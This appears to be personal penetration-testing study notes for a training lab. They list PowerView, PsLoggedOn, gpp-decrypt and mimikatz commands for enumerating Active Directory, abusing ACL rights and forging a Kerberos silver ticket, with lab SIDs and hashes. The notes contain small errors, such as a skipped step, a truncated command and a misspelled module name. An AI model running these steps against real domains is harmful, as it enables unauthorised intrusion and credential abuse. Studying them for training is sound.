```
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetGroup | select cn,description
Get-NetGroup "Sales Department" | select member


Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname

```

#### Step 1: users and groups
```
Get-NetUser | select cn,pwdlastset,lastlogon      //
Get-NetGroup | select cn                          // Common name 
Get-NetGroup "GroupName" | select member
```


#### Step 3 other machines
```
Find-LocalAdminAccess                            // Finds computers on the network where the current user has Admin access, from Powerview
Get-NetComputer | Select name                    // From PowerView
.\PsLoggedOn.exe \\COMPUTER_NAME                 // Finds where other users are/have logged on, from SysInternals. Requires the "Remote Registry" service to be enabled on the target, if not, use "Get-NetSession -ComputerName NAME"
.\PsLoggedOn.exe \\
```


### Domain shares
```
Find-DomainShare                                 // From PowerView, enumerated AD domain shares, might take 1-5 minutes
Find-DomainShare -CheckShareAccess               // Only display available shares, might take 1-5 minutes
ls \\dc1.corp.com\sysvol\corp.com\               // Example on connecting via Powershell
```
Note: if there are any readable Policy files, there will be an `AES-256`-encrypted password. To decrypt it, use `gpp-decrypt`


### SPN (Service Principle Name)
SPNs are the unique identifiers of Service Accounts. Using them, we can find out what IPs and ports a service uses.
```
Get-NetUser -SPN | select samaccountname,serviceprincipalname            // From powerview.ps1
setspn.exe -L SAMACCOUNTNAME
setspn.exe -L USERNAME
```
To get the IP, use
```
nslookup.exe web04.corp.com
```


### ACL / ACE
The Access Controll List (ACL) and Access Control Entries (ACE) decide user-specific accesses to AD objects. 
```
GenericAll: Full permissions on object                 (Exploit by resetting password)
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```

To list:
```
// Permissions of users in a group (not the group itself) to find targets
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights  
```


### Silver tickets
#### When to use:
- If a service hash was found, but no access to the server with the compromised users

```
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```
- To check if the ticket is enabled in memory, use the `klist`
- If the target is HTTP, use `iwr -UseDefaultCredentials http://TARGET`

| Argument   | Description                                         | Example                                    | Command                                                          |
| ---------- | --------------------------------------------------- | ------------------------------------------ | ---------------------------------------------------------------- |
| `/sid`     | The domain SID (the user SID without the last part) | `S-1-5-21-1987370270-658905905-1781884369` | `whoami /user`                                                   |
| `/domain`  | The domain name                                     | `corp.com`                                 | `Get-Domain`                                                     |
| `/ptt`     | Enable passing the ticket                           |                                            |                                                                  |
| `/target`  | The full name of the target machine                 | `web04.corp.com`                           | `Get-NetUser -SPN \| select samaccountname,serviceprincipalname` |
| `/service` | The protocol of the SPN                             | `http`                                     | `Get-NetUser -SPN \| select samaccountname,serviceprincipalname` |
| `/rc4`     | The NTLM hash of the SPN                            | `4d28cf5252d39971419580a51484ca09`         | `sekursla::logonpasswords`                                       |
| `/user`    | The user, can be any.                               | `jeff`                                     | `Get-DomainUser`                                                 |
